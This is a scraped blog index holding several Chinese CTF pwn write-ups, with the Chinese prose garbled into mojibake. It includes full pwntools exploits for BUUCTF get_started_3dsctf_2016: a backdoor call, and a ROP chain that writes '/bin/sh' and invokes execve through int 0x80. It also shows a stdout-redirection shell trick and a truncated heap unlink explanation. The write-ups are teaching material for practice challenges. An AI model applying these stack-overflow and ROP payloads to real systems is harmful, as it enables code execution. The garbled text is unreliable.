pg(m_elf.symbols[\u0026#39;fl4g\u0026#39;]) p.sendline(payload) p.clean() p.interactive() ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/printf%E4%B8%8D%E5%88%B7%E6%96%B0%E7%BC%93%E5%86%B2%E5%8C%BAnot_the_same_3dsctf_2016/","section":"writeup","summary":"\u0026ldquo;ã€Write-upã€‘BUUCTF not_the_same_3dsctf_2016 åŸé¢˜é“¾æ¥ \u0026quot;ã€Write-upã€‘BUUCTF not_the_same_3dsctf_2016 checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç ","tags":["pwn","printfä¸åˆ·æ–°ç¼“å†²åŒº","æ— å›æ˜¾"],"title":"ã€printfä¸åˆ·æ–°ç¼“å†²åŒºã€‘not_the_same_3dsctf_2016"},{"categories":["writeup"],"contents":"åŸé¢˜é“¾æ¥\nç›´æ¥ç»™äº†shellï¼Œä½†æ˜¯æŠŠè¾“å‡ºæµå…³äº† è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥ç”¨shellé‡å®šå‘è¾“å‡ºæµåˆ°è¾“å…¥æµï¼š\nexec 1\u0026gt;\u0026amp;0 cat flag ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/shell%E9%87%8D%E5%AE%9A%E5%90%91buuctf-wustctf2020_closed/","section":"writeup","summary":"åŸé¢˜é“¾æ¥ ç›´æ¥ç»™äº†shellï¼Œä½†æ˜¯æŠŠè¾“å‡ºæµå…³äº† è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥ç”¨shellé‡å®šå‘è¾“å‡ºæµåˆ°è¾“å…¥æµï¼š exec 1\u0026gt;\u0026amp;0 cat flag","tags":["pwn","shellé‡å®šå‘"],"title":"ã€shellé‡å®šå‘ã€‘BUUCTF wustctf2020_closed"},{"categories":["writeup"],"contents":"ã€syscallã€‘ã€Write-upã€‘BUUCTF Get_started_3dsctf_2016 åŸé¢˜é“¾æ¥\nåœ¨åšé¢˜å‰ï¼Œæˆ‘å…ˆä¸ºå…¶å»ºç«‹äº†ä¸€ä¸ªä¸“é—¨çš„å·¥ä½œç›®å½•ï¼š ã€syscallã€‘ã€Write-upã€‘BUUCTF Get_started_3dsctf_2016 checksec æŸ¥çœ‹æ¶æ„ ida æŸ¥çœ‹ç¨‹åºï¼ˆä¼ªï¼‰ä»£ç  main å‡½æ•° åé—¨å‡½æ•° æ„å»º exp é€šè¿‡åé—¨å‡½æ•°æ„å»º exp å®Œæ•´ exp1 é€šè¿‡ syscall æ„å»º exp æ²¡æœ‰ç°æˆ\u0026quot;/bin/sh\u0026quot;ï¼šæ„å»ºå­—ç¬¦ä¸² å®Œæ•´ exp2 ä¸€äº›æ‚¬è€Œæœªå†³çš„å°é—®é¢˜ ä½œè€…è¯•å›¾ä¸ä½¿ç”¨pop edx;pop ecx;pop ebx;retåªä½¿ç”¨pop edx;ret æ— æ³•æ‰§è¡Œå…¶ä»–äºŒè¿›åˆ¶æ–‡ä»¶ checksec æŸ¥çœ‹æ¶æ„ çœ‹æ¥æ˜¯ 32 ä½çš„ç¨‹åºã€‚æˆ‘ä»¬é¦–å…ˆå°±è¦æƒ³åˆ°ï¼Œ32 ä½ç¨‹åºçš„å‚æ•°ä¼ é€’æ–¹å¼å’Œ 64 ä½ç¨‹åºçš„æ˜¯ä¸ä¸€æ ·çš„ï¼š\n32 ä½å°†å‚æ•°ä»å³åˆ°å·¦å…ˆåå‹å…¥æ ˆä¸­ 64 ä½ç¨‹åºå°†å‚æ•°åˆ†åˆ«ç”¨ RDI,RSI,RCX,RDX,R8,R9 ä½œä¸ºç¬¬ 1-6 ä¸ªå‚æ•°ï¼Œç”¨ RAX ä¿å­˜è¿”å›å€¼ æ‰€ä»¥ï¼Œæˆ‘ä»¬è°ƒç”¨ system å‡½æ•°çš„æ€è·¯å°±ä¸ä¸€æ ·äº†ã€‚æˆ‘ä»¬å°±ä¸éœ€è¦ pop rdi;ret è¿™ä¸ª gadgetï¼ˆåœ¨ 32 ä½ç¨‹åºä¸­ä¹Ÿæ‰¾ä¸åˆ°ï¼‰ï¼Œè€Œæ˜¯åªéœ€è¦æ³¨æ„ç”¨ ret è¿™ä¸ª gadget ä¿æŒæ ˆè¿”å›æ—¶æœ€åä¸€ä½ä¸º 0 å³å¯ï¼ˆsystem ç‰¹æ®Šè§„å®šï¼‰ï¼Œå¯ä»¥å‚è€ƒè¿™é‡Œ\nä½†æ˜¯å¦‚æœç¨‹åºå¾ˆå¥½å¿ƒåœ°ä¸ºæˆ‘ä»¬æä¾›äº†åé—¨å‡½æ•°ï¼Œé‚£ä¸Šé¢çš„è¿™äº›ä¹Ÿä¸ç”¨è€ƒè™‘äº†\nåŒæ—¶ï¼Œæˆ‘ä»¬è¦æ³¨æ„ 32 ä½ç¨‹åºç”±äºå‚æ•°ä¿å­˜åœ¨æ ˆä¸­ï¼Œcall çš„åŒæ—¶è¿˜ä¼šå°†ã€ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åç§»ã€‘å‹å…¥æ ˆä¸­ï¼Œå› æ­¤æˆ‘ä»¬è¦ä¸ºã€ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åç§»ã€‘é¢„ç•™å‡ºä½ç½®\nida æŸ¥çœ‹ç¨‹åºï¼ˆä¼ªï¼‰ä»£ç  main å‡½æ•° çœ‹æ¥æ˜¯ç®€å•çš„æ ˆæº¢å‡º\nå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªå°å‘ï¼Œå³ printf å’Œ puts çš„åŒºåˆ«ã€‚\nprintf åœ¨è°ƒç”¨å®Œåå¹¶ä¸ä¼šé©¬ä¸Šæ‰“å°å‡ºå­—ç¬¦ä¸²ï¼Œè€Œæ˜¯ç­‰å¾…åˆ·æ–°ç¼“å†²åŒºçš„æŒ‡ä»¤ä¹‹åæ‰æ˜¾ç¤ºå­—ç¬¦ä¸²ã€‚åœ¨è¿™é‡Œå°±ä½“ç°ä¸ºï¼Œåˆ° gets å‡½æ•°å‘ç”¨æˆ·è¯·æ±‚è¾“å…¥æ—¶ï¼Œè¿˜æ²¡æœ‰ä»»ä½•å­—ç¬¦ä¸²æ˜¾ç¤ºã€‚\nå› æ­¤ï¼Œå¯èƒ½æœ‰äººä¼šåœ¨å†™ exp çš„æ—¶å€™ï¼Œä¸€ç›´ç­‰å¾…å­—ç¬¦ä¸²è¾“å‡ºï¼Œçœ‹ä¸€ç›´æ²¡ååº”è¿˜ä»¥ä¸ºè‡ªå·± payload å†™é”™äº†ï¼ˆ\nå…·ä½“çš„ printf å’Œ puts çš„åŒºåˆ«å¯ä»¥çœ‹è¿™ä½å¤§ä½¬çš„åšæ–‡ï¼Œéå¸¸è¯¦ç»†\nåé—¨å‡½æ•° ç„¶åæˆ‘ä»¬å°±å‘ç°äº†ç¨‹åºå¥½å¿ƒä¸ºæˆ‘ä»¬æä¾›çš„åé—¨å‡½æ•°ï¼ˆ\nåªè¦æˆ‘ä»¬ä¼ å…¥å‚æ•°åˆ†åˆ«ä¸º 814536271 å’Œ 425138641ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½å¾—åˆ° flag çš„å†…å®¹\næ„å»º exp é€šè¿‡åé—¨å‡½æ•°æ„å»º exp æ­¥éª¤å¦‚ä¸‹ï¼š\né¦–å…ˆæˆ‘ä»¬è¦æ‰¾åˆ° offset æº¢å‡ºåˆ° return çš„æ ˆåœ°å€ï¼Œè¿™é€šè¿‡ ida å¾ˆå®¹æ˜“å‘ç° ç„¶åæˆ‘ä»¬å°±å°†åé—¨å‡½æ•°åœ°å€å’Œå‚æ•°å€¼å¡«å…¥æ ˆä¸­å³å¯ # pg = p32 payload = b\u0026#34;a\u0026#34;*0x38 + pg(0x80489a0) + pg(0) + pg(814536271) + pg(425138641) ç„¶åç›´æ¥ sendline å°± ğŸ†— å•¦\nå®Œæ•´ exp1 from pwn import * from pwn import p64, p32 pss: bool = False fn: str = \u0026#34;./get_started_3dsctf_2016\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;25191\u0026#34; if_32: bool = True pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: p = process(fn) payload = b\u0026#34;a\u0026#34;*0x38 + pg(0x80489a0) + pg(0) + pg(814536271) + pg(425138641) p.sendline(payload) p.interactive() é€šè¿‡ syscall æ„å»º exp æˆ‘ä»¬é€šè¿‡ ida å¯ä»¥å¾—çŸ¥ï¼Œè¯¥ç¨‹åº plt è¡¨å†…æ²¡æœ‰ system å‡½æ•°ä¹Ÿæ²¡æœ‰ execve å‡½æ•°ï¼ŒåŒæ—¶æ­¤é¢˜åˆæ˜¯é™æ€ç¼–è¯‘ï¼Œå°±ä¸èƒ½é€‚ç”¨ ret2libc çš„æ–¹æ³•ä» libc ä¸­æ‰¾åˆ° systemã€‚\nä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ç¨‹åºä¸­æ–­æ—¶äº§ç”Ÿçš„ç³»ç»Ÿè°ƒç”¨æ¥æ‰§è¡Œ execve è¿™ä¸ªä¸­æ–­ç¨‹åº\nå…¨éƒ¨ä¸­æ–­ç¨‹åºç¼–å·è§æ­¤\nè¿™é‡Œæˆ‘ä»¬åªéœ€è¦æ‰¾åˆ° 59 å·ä¸­æ–­ç¨‹åºï¼Œå‘å®ƒä¼ å‚å³å¯\n64 ä½ç¼–å·æ˜¯ 59ï¼Œä¹Ÿå°±æ˜¯ 0x3b\n32 ä½ç¼–å·æ˜¯ 11ï¼Œä¹Ÿå°±æ˜¯ 0xbã€‚\nåŒæ—¶ï¼Œå› ä¸ºæˆ‘ä»¬çš„ç¨‹åºæ˜¯ 32 ä½çš„ï¼Œæˆ‘ä»¬éœ€è¦å°†ç¼–å·ä¼ ç»™ eax å¯„å­˜å™¨ï¼Œå‰©ä½™å‚æ•°åˆ†åˆ«ä¼ å…¥ ecx,edx,esi,edi,ebp ä¸­\nç„¶åï¼Œæˆ‘ä»¬è¦æ‰¾åˆ°è¿™å‡ ä¸ªå‚æ•°å¯¹åº”çš„å€¼ã€‚execve å‡½æ•°åä¸¤ä¸ªå‚æ•°å¯ä»¥ä¸ç®¡è®¾ä¸º 0ï¼Œä½†æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°åº”è¯¥æ˜¯/bin/shæˆ–è€…sh\nä¸ºäº†å°†è¿™å‡ ä¸ªå‚æ•°é€å…¥å¯„å­˜å™¨ä¸­ï¼Œæˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ª gadgetï¼Œä¸ä»…å¯ä»¥å®Œæˆä»»åŠ¡ï¼Œè¿˜å¯ä»¥é€šè¿‡retæŒ‡ä»¤æ¥ç€è¯»ä¸‹ä¸€æ¡æŒ‡ä»¤\næˆ‘ä»¬ç”¨ROPgadget --binary get_started_3dsctf_2016 --only \u0026quot;pop|ret\u0026quot; | grep eaxæ‰¾ gadgetï¼š\næ¯”è¾ƒé—æ†¾çš„æ˜¯ï¼Œæ²¡æœ‰åˆšåˆšå¥½çš„ gadgetï¼Œä½†æ˜¯æœ‰ä¸€æ¡å‹‰å¼ºå¯ç”¨ï¼š\n0x080b91e6 : pop eax ; ret é‚£æˆ‘ä»¬ç»§ç»­æ‰¾ ebxã€ecxã€edxï¼š\n$ROPgadget --binary get_started_3dsctf_2016 --only \u0026#34;pop|ret\u0026#34; | grep ebx 0x0809e102 : pop ds ; pop ebx ; pop esi ; pop edi ; ret 0x0809e0fa : pop eax ; pop ebx ; pop esi ; pop edi ; ret 0x0805bf3d : pop ebp ; pop ebx ; pop esi ; pop edi ; ret 0x0809e4c4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret 0x0809a7dc : pop ebx ; pop edi ; ret 0x0806fc09 : pop ebx ; pop edx ; ret 0x0804f460 : pop ebx ; pop esi ; pop ebp ; ret 0x080483b7 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x080a25b6 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10 0x08096b1e : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14 0x080718b1 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc 0x0804ab66 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4 0x08049a95 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8 0x080509a5 : pop ebx ; pop esi ; pop edi ; ret 0x080498af : pop ebx ; pop esi ; pop edi ; ret 4 0x08049923 : pop ebx ; pop esi ; ret 0x080481ad : pop ebx ; ret 0x080d413c : pop ebx ; ret 0x6f9 0x08099f96 : pop ebx ; ret 8 0x0806fc31 : pop ecx ; pop ebx ; ret 0x08063adb : pop edi ; pop esi ; pop ebx ; ret 0x0806fc30 : pop edx ; pop ecx ; pop ebx ; ret 0x0809e0f9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret 0x0807b1b0 : pop es ; pop ebx ; ret 0x0806fc08 : pop esi ; pop ebx ; pop edx ; ret 0x0805d090 : pop esi ; pop ebx ; ret 0x0805b8a0 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x0809efe2 : pop ss ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret å…¶ä¸­ï¼Œæœ‰ä¸€æ¡ä¸€ä¸‹å­å°±èƒ½åŒæ—¶è®¾ç½®ä¸‰ä¸ªéœ€è¦ç”¨çš„å¯„å­˜å™¨ï¼š\n0x0806fc30 : pop edx ; pop ecx ; pop ebx ; ret é‚£ç°åœ¨æˆ‘ä»¬çš„æ ˆä»ä½åˆ°é«˜å°±åº”è¯¥æ˜¯ eax-\u0026gt;edx-\u0026gt;ecx-\u0026gt;ebx ç„¶åæˆ‘ä»¬éœ€è¦æ‰¾åˆ°int 0x80è¿™ä¸ª 32 ä½ç³»ç»Ÿè°ƒç”¨ system call çš„ä¸­æ–­æŒ‡ä»¤ï¼ˆ64 ä½å°±æ˜¯ syscallï¼‰ï¼š0x0806d7e5 : int 0x80 ç„¶åæˆ‘ä»¬éœ€è¦æ‰¾åˆ°å¡«å…¥ ebx å¯„å­˜å™¨çš„/bin/shã€‚ç»“æœæ˜¯æ²¡æœ‰/bin/sh PS.è¿™é‡Œä¸èƒ½ç›´æ¥æ‰¾shå­—ç¬¦ä¸²ï¼Œå› ä¸º execve å‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ pathï¼Œå¿…é¡»æ˜¯ç»å¯¹åœ°å€ï¼Œè€Œä¸”å¿…é¡»æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆæˆ–è€…è„šæœ¬æ–‡ä»¶ï¼Œä½†æ˜¯åªä¼šæ‰§è¡Œ!#ä¹‹åçš„é‚£ä¸ªè§£é‡Šå™¨ï¼‰ã€‚åœ¨ Linux ç³»ç»Ÿç§çš„shå‘½ä»¤æ˜¯è½¯é“¾æ¥ï¼Œå¹¶ä¸æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶\nå…·ä½“å¯ä»¥æŸ¥çœ‹è¿™ç¯‡åšå®¢ï¼Œè¿™ç¯‡åšå®¢ä¹Ÿå¾ˆä¸é”™\næ²¡æœ‰ç°æˆ\u0026quot;/bin/sh\u0026quot;ï¼šæ„å»ºå­—ç¬¦ä¸² è¿™é¢˜æ˜¯é™æ€é“¾æ¥ï¼Œæ²¡æ³• ret2libcã€‚\nä½†æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾ä¸€å¤„æ²¡æœ‰ç”¨åˆ°çš„åœ°å€ï¼Œåˆ©ç”¨ä¸€äº› gadget å°†æˆ‘ä»¬éœ€è¦çš„å€¼å†™è¿›å»ï¼Œç„¶åæˆ‘ä»¬å°±å¾—åˆ°äº†ä¸€ä¸ªç¨‹åºå¯ä»¥ä½¿ç”¨çš„\u0026quot;/bin/sh\u0026quot;å­—ç¬¦ä¸²åœ°å€ï¼\né¦–å…ˆæˆ‘ä»¬éœ€è¦ä¸€æ¡æŒ‡ä»¤ï¼Œæ”¯æŒæˆ‘ä»¬å‘å†…å­˜ä¸­å†™å…¥å€¼ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ pop æ ˆä¸­çš„å€¼åˆ°å¯„å­˜å™¨ï¼Œå†å°†ç©ºé—²å†…å­˜çš„åœ°å€èµ‹ç»™å¦ä¸€ä¸ªå¯„å­˜å™¨ï¼Œè¿™æ ·å°±å¯ä»¥å‘ç©ºé—²åœ°å€å†™å…¥å€¼äº†\né€šè¿‡ROPgadget --binary get_started_3dsctf_2016 --only \u0026quot;mov|ret\u0026quot;å‘½ä»¤ç„¶åæˆ‘ä»¬æ‰¾åˆ°äº†è¿™ä¸ªå¯ç”¨çš„ gadgetï¼š\n# dwordè¡¨ç¤ºåŒå­—ï¼Œå°±æ˜¯å››ä¸ªå­—èŠ‚ï¼Œåˆšå¥½æ˜¯32ä½å¯„å­˜å™¨çš„å¤§å° 0x080557ab : mov dword ptr [edx], eax ; ret ç„¶åæˆ‘ä»¬å¯ä»¥ç›´æ¥åˆ©ç”¨ä¹‹å‰æ‰¾åˆ°è¿‡çš„pop edx;pop ecx;pop ebx;retå°†åœ°å€å¼¹åˆ° edx ä¸­\nç„¶åæˆ‘ä»¬ç”¨ ida æ‰¾åˆ°ä¸€å—é—²ç½®ç©ºé—´ï¼ˆä¸€ç›´æ»šåˆ°.data æ®µï¼Œæœ€åæœ‰ä¸€å°æ®µé‡å¤çš„ db 0ï¼‰\nç„¶åæˆ‘ä»¬å°±å¯ä»¥å®Œæˆæˆ‘ä»¬çš„ payload äº†ï¼š\npop_eax_ret = 0x080b91e6 pop_edx_ecx_ebx_ret = 0x0806fc30 int80 = 0x0806d7e5 mov_edx_eax_ret = 0x080557ab spare_space = 0x080EB0C0 payload = b\u0026#39;a\u0026#39;*0x38+pg(pop_eax_ret)+b\u0026#34;/bin\u0026#34;+pg(pop_edx_ecx_ebx_ret) + \\ pg(spare_space)+pg(0)+pg(0)+pg(mov_ecx_eax_ret) payload += pg(pop_eax_ret)+b\u0026#39;/sh\\x00\u0026#39;+pg(pop_edx_ecx_ebx_ret) + \\ pg(spare_space+4)+pg(0)+pg(0)+pg(mov_edx_eax_ret) payload += pg(pop_eax_ret)+pg(0xb)+pg(pop_edx_ecx_ebx_ret) + \\ pg(0)+pg(0)+pg(spare_space)+pg(int80) å®Œæ•´ exp2 from pwn import * from pwn import p64, p32 pss: bool = False fn: str = \u0026#34;./get_started_3dsctf_2016\u0026#34; # libc_name: str = \u0026#34;\u0026#34; port: str = \u0026#34;\u0026#34; if_32: bool = True pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if_debug: bool = False if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: shell = gdb.debug(fn, \u0026#34;b* 0x8048A40\u0026#34;) else: p = process(fn) pop_eax_ret = 0x080b91e6 pop_edx_ecx_ebx_ret = 0x0806fc30 int80 = 0x0806d7e5 mov_edx_eax_ret = 0x080557ab spare_space = 0x080EB0C0 pop_edx_ret = 0x0806fc0a pop_ecx_ebx_ret = 0x0806fc31 mov_ecx_eax_ret = 0x080701a5 payload = b\u0026#39;a\u0026#39;*0x38+pg(pop_eax_ret)+b\u0026#34;/bin\u0026#34;+pg(pop_edx_ecx_ebx_ret) + \\ pg(spare_space)+pg(0)+pg(0)+pg(mov_edx_eax_ret) payload += pg(pop_eax_ret)+b\u0026#39;/sh\\x00\u0026#39;+pg(pop_edx_ecx_ebx_ret) + \\ pg(spare_space+4)+pg(0)+pg(0)+pg(mov_edx_eax_ret) payload += pg(pop_eax_ret)+pg(0xb)+pg(pop_edx_ecx_ebx_ret) + \\ pg(0)+pg(0)+pg(spare_space)+pg(int80) if if_debug: shell.sendline(payload) shell.interactive() else: p.sendline(payload) p.interactive() ä¸€äº›æ‚¬è€Œæœªå†³çš„å°é—®é¢˜ ä½œè€…è¯•å›¾ä¸ä½¿ç”¨pop edx;pop ecx;pop ebx;retåªä½¿ç”¨pop edx;ret æˆ‘ä»¬ç”¨ ROPgadget --binary get_started_3dsctf_2016 --only \u0026quot;pop|ret\u0026quot;å‘½ä»¤æ‰¾åˆ°äº†pop edxçš„å‘½ä»¤\n0x0806fc0a : pop edx ; ret çœ‹èµ·æ¥ä¼¼ä¹æ²¡æœ‰é—®é¢˜\nä»¤äººç–‘æƒ‘çš„æ˜¯ï¼Œè¿™æ ·å­è¿æ ˆéƒ½æ²¡æ³•å†™å…¥(åœ¨ pop eax åå°±æ˜¯è¿ä¸²çš„ popal)ï¼Œå¯èƒ½æ˜¯æˆ‘æ‰¾çš„è¿™ä¸ª gadget æœ¬èº«æœ‰ç‚¹å°é—®é¢˜\nä½†æ˜¯æˆ‘å°è¯•äº†pop ecx;pop ebx;retå’Œmov [ecx+4], eaxï¼Œç¨‹åºå®Œå…¨æ­£å¸¸è¿ä½œï¼Œå¯ä»¥æ­£å¸¸å¾—åˆ° shell\npayload å¦‚ä¸‹ï¼š\npop_eax_ret = 0x080b91e6 pop_edx_ecx_ebx_ret = 0x0806fc30 int80 = 0x0806d7e5 mov_edx_eax_ret = 0x080557ab spare_space = 0x080EB0C0 pop_edx_ret = 0x0806fc0a pop_ecx_ebx_ret = 0x0806fc31 mov_ecx_eax_ret = 0x080701a5 # è¿™é‡Œä¸€å®šè¦-4ï¼Œå› ä¸ºgadgetåŠ äº†4 payload = b\u0026#39;a\u0026#39;*0x38+pg(pop_eax_ret)+b\u0026#34;/bin\u0026#34;+pg(pop_ecx_ebx_ret) + \\ pg(spare_space-4)+pg(0)+pg(0)+pg(mov_ecx_eax_ret) payload += pg(pop_eax_ret)+b\u0026#39;/sh\\x00\u0026#39;+pg(pop_edx_ecx_ebx_ret) + \\ pg(spare_space+4)+pg(0)+pg(0)+pg(mov_edx_eax_ret) payload += pg(pop_eax_ret)+pg(0xb)+pg(pop_edx_ecx_ebx_ret) + \\ pg(0)+pg(0)+pg(spare_space)+pg(int80) æ— æ³•æ‰§è¡Œå…¶ä»–äºŒè¿›åˆ¶æ–‡ä»¶ ä½œè€…ä¸€å¼€å§‹è¯•å›¾execve(\u0026quot;sh\u0026quot;, 0, 0)ï¼Œä½†æ˜¯æŸ¥é˜…èµ„æ–™åæ˜ç™½åªèƒ½æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œäºæ˜¯åˆè¯•å›¾æ‰§è¡Œ/bin/lså’Œ/usr/bin/python3.10ï¼Œä½†æ˜¯å‡å› ä¸æ˜åŸå› å¤±è´¥äº†\nå¦‚æœå„ä½çœ‹å®˜çŸ¥é“äº†åŸå› ï¼Œå¯ä»¥åŠ³çƒ¦æ‚¨åœ¨è¯„è®ºåŒºä¸ºä½œè€…å’Œåæ¥äººä½œä¸€ç•ªè§£é‡Šå—ï¼Ÿæ„Ÿæ¿€ä¸å°½ï¼\n","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/syscallget_started_3dsctf_2016/","section":"writeup","summary":"ã€syscallã€‘ã€Write-upã€‘BUUCTF Get_started_3dsctf_2016 åŸé¢˜é“¾æ¥ åœ¨åšé¢˜å‰ï¼Œæˆ‘å…ˆä¸ºå…¶å»ºç«‹äº†ä¸€ä¸ªä¸“é—¨çš„å·¥ä½œç›®å½•ï¼š ã€syscallã€‘ã€Write-upã€‘BUUC","tags":["pwn","syscall"],"title":"ã€syscallã€‘get_started_3dsctf_2016"},{"categories":["writeup"],"contents":"åŸé¢˜é“¾æ¥\nchecksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ä¼ªä»£ç  å…¸å‹çš„å †èœå•é¢˜\nä»‹ç»ä¸€ä¸‹unlink unlinkå…¶å®å°±æ˜¯å¾ˆæ™®é€šï¼Œå¾ˆå¸¸è§„çš„ä¸€ç§ä»åŒå‘é“¾è¡¨ä¸­å–å‡ºèŠ‚ç‚¹çš„æœºåˆ¶\nå½“æˆ‘ä»¬freeæ‰ä¸€ä¸ªchunkçš„æ—¶å€™ï¼Œç¨‹åºä¼šæŸ¥çœ‹ç›¸é‚»çš„chunkæ—¶å€™ä¹Ÿè¢«freeæ‰äº†ï¼Œå¦‚æœä¹Ÿè¢«freeæ‰äº†ï¼Œå°±æŠŠå®ƒä»åŒå‘é“¾è¡¨ä¸­å–å‡ºæ¥ï¼ˆæ³¨æ„fastbinæ˜¯å•å‘é“¾è¡¨ï¼‰ï¼Œæ‰§è¡Œunlinkï¼Œä¸å½“å‰freeçš„chunkåˆå¹¶ï¼Œç„¶åæ”¾å…¥å®ƒåº”è¯¥å»çš„binä¸­\næˆ‘ä»¬çš„chunkæœ‰fdå’Œbkä¸¤ä¸ªåŸŸï¼Œåˆ†åˆ«æŒ‡å‘ï¼ˆé“¾è¡¨ä¸­ï¼‰å‰ä¸€ä¸ªchunkå’Œåä¸€ä¸ªchunkï¼Œä¹Ÿå°±æ˜¯è¯´ï¼ŒfdåŸŸé‡Œä¿å­˜çš„æ˜¯å‰ä¸€ä¸ªchunkçš„åœ°å€ï¼Œbkæ˜¯åä¸€ä¸ªchunkçš„åœ°å€\nunlinkä¼šæ›´æ”¹chunk0å’Œchunk2çš„çš„fdå’ŒbkæŒ‡é’ˆï¼Œä¹Ÿå°±æ˜¯è¯´\nchunk0-\u0026gt;bk = chunk2 chunk2-\u0026gt;fd = chunk0 åˆå› ä¸ºfdå’Œbkåœ¨åŒæ ·ä½æ•°çš„ç³»ç»Ÿï¼Œæ¯”å¦‚64ä½çš„ç³»ç»Ÿä¸‹ï¼Œç›¸è¾ƒäºchunkæŒ‡é’ˆçš„åç§»æ˜¯å›ºå®šçš„ï¼Œå› æ­¤ï¼Œä¸Šé¢çš„ä»£ç åˆç­‰ä»·äº\n*(chunk0 + 0x18) = chunk2 *(chunk2 + 0x10) = chunk0 è€Œæ­¤æ—¶ï¼Œå¦‚æœæˆ‘ä»¬è¦unlinkçš„chunkçš„fdåŸŸå’ŒbkåŸŸï¼Œåˆ™ä¸Šé¢çš„ä»£ç ä¼šäº§ç”Ÿè¿™æ ·çš„æ•ˆæœï¼š *(ptr1 + 0x18) = ptr2 *(ptr2 + 0x10) = ptr1 é‚£ä¹ˆï¼Œæˆ‘ä»¬å°±å¯ä»¥æ›´æ”¹ptr1ä¸‹æ–¹0x10ä½ç½®å’Œ0x18ä½ç½®çš„å€¼äº†ï¼\nä½†æ˜¯è¿™ä¸ªunlinkæœºåˆ¶è¿˜å­˜åœ¨ç€ä¸€ç³»åˆ—å®‰å…¨æ£€æŸ¥ï¼š\nè¿™äº›æ£€æŸ¥ç¡®ä¿ï¼š\nè¦è¿›è¡Œunlinkçš„chunkçš„sizeä½å’Œå½“å‰è¢«freeçš„chunkçš„prev_sizeä½ç›¸åŒï¼ŒåŒæ—¶å®ƒçš„prev_inuseä½è¦ç½®é›¶ è¦è¿›è¡Œunlinkçš„chunkçš„ä¸Šä¸€ä¸ªchunkçš„bkä½æŒ‡å‘å½“å‰chunkï¼Œä¸‹ä¸€ä¸ªchunkçš„fdä½æŒ‡å‘å½“å‰chunk ä¹Ÿå°±æ˜¯è¯´ï¼š *(ptr1 + 0x18) == chunk1 *(ptr2 + 0x10) == chunk1 å¦‚ä½•ç»•è¿‡ï¼Ÿ ç³»ç»ŸæœŸå¾…çš„æ˜¯ä¸Šä¸€ä¸ªchunkçš„bkåŸŸå†…å­˜çš„å€¼æ˜¯chunk1ï¼Œä¸‹ä¸€ä¸ªchunkçš„fdåŸŸå†…å­˜çš„å€¼ä¹Ÿæ˜¯chunk1ï¼Œå½“æˆ‘ä»¬å¯ä»¥è®©\nptr1 = \u0026amp;chunk1 - 0x18 ptr2 = \u0026amp;chunk1 - 0x10 è¿™æ ·å°±å¯ä»¥ç»•è¿‡æ£€æŸ¥ï¼Œè¿™æ ·æœ€åçš„ç»“æœå°±æ˜¯ï¼š\nchunk1 = \u0026amp;chunk1 - 0x10 chunk1 = \u0026amp;chunk1 - 0x18 æˆ‘ä»¬è®©chunk1å˜æˆäº†å­˜æ”¾chunk1çš„å†…å­˜ä¸Šæ–¹0x18è¿™ä¸ªåœ°å€\nç„¶åæˆ‘ä»¬å°±å¯ä»¥æ›´æ”¹å­˜æ”¾chunk1çš„å†…å­˜çš„å€¼ï¼Œå°±å¯ä»¥å®ç°ä»»æ„åœ°å€å†™ï¼\næœ¬é¢˜æ€è·¯ ç”³è¯·ä¸‰å—0x80çš„chunkï¼Œåœ¨ç¬¬ä¸€å—chunkå†…ä¼ªé€ ä¸€ä¸ª0x70çš„å·²freeçš„chunkï¼Œç„¶åæ›´æ”¹ä¸‹ä¸€ä¸ªchunkçš„prev_sizeä½å’Œsizeä½ä»è€Œå®ç°unlink\nç„¶åæˆ‘ä»¬å¯ä»¥æ›´æ”¹å­˜æ”¾chunk1çš„å†…å­˜çš„å€¼ï¼Œå°†å…¶æ”¹ä¸ºatoiçš„gotå€¼ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ³„éœ²å‡ºlibcçš„åŸºå€\nç„¶åæˆ‘ä»¬åˆå¯ä»¥æ›´æ”¹atoiçš„gotå€¼ï¼Œæ”¹ä¸ºsystemï¼Œå†ä¼ å…¥\u0026quot;/bin/sh\\x00\u0026quot;å³å¯\nfrom pwn import * from pwn 